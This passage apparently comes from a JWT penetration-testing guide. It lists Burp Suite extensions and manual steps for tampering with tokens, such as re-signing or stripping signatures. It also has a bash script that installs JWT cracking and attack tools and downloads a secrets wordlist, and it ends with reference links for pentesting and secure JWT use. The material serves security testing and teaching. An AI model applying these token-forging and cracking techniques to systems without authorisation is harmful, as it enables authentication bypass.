  ```txt [Burp Extensions]
  # Essential Burp Suite extensions for JWT testing:

  1. JSON Web Tokens (BApp Store)
     - Decode/edit JWTs in Burp
     - Highlight JWT parameters
     - Auto-detect JWTs in requests

  2. JWT Editor (BApp Store)
     - Edit JWT claims in Burp Repeater
     - Sign with custom keys
     - Algorithm confusion attacks
     - Key confusion testing

  3. JOSEPH (JavaScript Object Signing and Encryption Pentesting Helper)
     - Automated JWT attack suite
     - Key confusion
     - Signature bypass
     - Claim manipulation

  # Burp Suite Pro Scanner:
  - Automatically detects JWT vulnerabilities
  - Tests algorithm none
  - Tests signature verification

  # Manual testing in Burp:
  1. Capture JWT in Proxy/Repeater
  2. Use JWT Editor tab to decode
  3. Modify header/payload
  4. Re-sign (or remove signature)
  5. Forward modified request
  6. Check response
  ```
  :::
::

---

## Tool Installation

::code-collapse
```bash [install_jwt_tools.sh]
#!/bin/bash
#============================================================
# Install All JWT Attack Tools
#============================================================

echo "[*] Installing JWT attack tools..."

# jwt_tool (primary tool)
git clone https://github.com/ticarpi/jwt_tool.git /opt/jwt_tool
cd /opt/jwt_tool && pip3 install -r requirements.txt
sudo ln -sf /opt/jwt_tool/jwt_tool.py /usr/local/bin/jwt_tool

# jwt-cracker (Node.js brute forcer)
npm install -g jwt-cracker 2>/dev/null

# Python JWT library
pip3 install PyJWT cryptography

# hashcat (should be pre-installed on Kali)
sudo apt install hashcat -y 2>/dev/null

# John the Ripper
sudo apt install john -y 2>/dev/null

# jq (JSON parser)
sudo apt install jq -y

# jwt-hack
go install -v github.com/nicholasgasior/jwt-hack@latest 2>/dev/null

# Download jwt secrets wordlist
mkdir -p ~/wordlists
curl -sL "https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list" \
  -o ~/wordlists/jwt_secrets.txt

echo "[+] All JWT tools installed!"
echo "[*] Usage: jwt_tool \$TOKEN"
```
::

---

## References & Resources

::card-group
  ::card
  ---
  title: PortSwigger - JWT Attacks
  icon: i-lucide-graduation-cap
  to: https://portswigger.net/web-security/jwt
  target: _blank
  ---
  Comprehensive interactive labs covering JWT algorithm confusion, signature bypass, key injection, kid exploitation, and all major JWT attack vectors.
  ::

  ::card
  ---
  title: HackTricks - JWT Vulnerabilities
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html
  target: _blank
  ---
  Detailed JWT hacking guide covering algorithm none, RS256→HS256 confusion, kid injection, JKU spoofing, and claim manipulation with payloads.
  ::

  ::card
  ---
  title: jwt_tool
  icon: i-simple-icons-github
  to: https://github.com/ticarpi/jwt_tool
  target: _blank
  ---
  The Swiss Army Knife for JWT pentesting. Supports algorithm confusion, none attack, key cracking, claim tampering, and automated exploitation.
  ::

  ::card
  ---
  title: PayloadsAllTheThings - JWT
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token
  target: _blank
  ---
  Curated collection of JWT attack payloads, signing tricks, claim manipulation techniques, and tool commands.
  ::

  ::card
  ---
  title: RFC 7519 - JSON Web Token
  icon: i-lucide-file-text
  to: https://datatracker.ietf.org/doc/html/rfc7519
  target: _blank
  ---
  The official JWT specification. Understanding the standard is essential for identifying implementation deviations and security flaws.
  ::

  ::card
  ---
  title: RFC 7515 - JSON Web Signature
  icon: i-lucide-file-text
  to: https://datatracker.ietf.org/doc/html/rfc7515
  target: _blank
  ---
  JWS specification defining signature mechanisms, header parameters (kid, jku, jwk, x5u, x5c), and algorithm identifiers.
  ::

  ::card
  ---
  title: jwt.io
  icon: i-lucide-globe
  to: https://jwt.io/
  target: _blank
  ---
  Online JWT decoder, verifier, and debugger. Essential tool for inspecting token structure, claims, and signature during testing.
  ::

  ::card
  ---
  title: JWT Secrets Wordlist
  icon: i-simple-icons-github
  to: https://github.com/wallarm/jwt-secrets
  target: _blank
  ---
  Curated wordlist of common JWT signing secrets collected from real-world applications, CTFs, and vulnerability reports.
  ::

  ::card
  ---
  title: Auth0 - JWT Best Practices
  icon: i-lucide-shield-check
  to: https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/
  target: _blank
  ---
  Auth0's analysis of JWT Best Current Practices draft, covering algorithm validation, key management, and claim verification requirements.
  ::

  ::card
  ---
  title: Critical Vulnerabilities in JWT Libraries
  icon: i-lucide-flask-conical
  to: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
  target: _blank
  ---
  Auth0's research on critical JWT library vulnerabilities including algorithm confusion attacks that affect multiple language implementations.
  ::

  ::card
  ---
  title: OWASP JWT Cheat Sheet
  icon: i-lucide-shield-check
  to: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
  target: _blank
  ---
  OWASP's practical cheat sheet for secure JWT implementation covering algorithm validation, secret management, and common pitfalls.
  ::

  ::card
  ---
  title: Bug Bounty JWT Reports
  icon: i-lucide-bug
  to: https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPAUTH.md
  target: _blank
  ---
  Collection of real-world HackerOne bug bounty reports involving JWT vulnerabilities with full technical details and bounty amounts.
  ::
::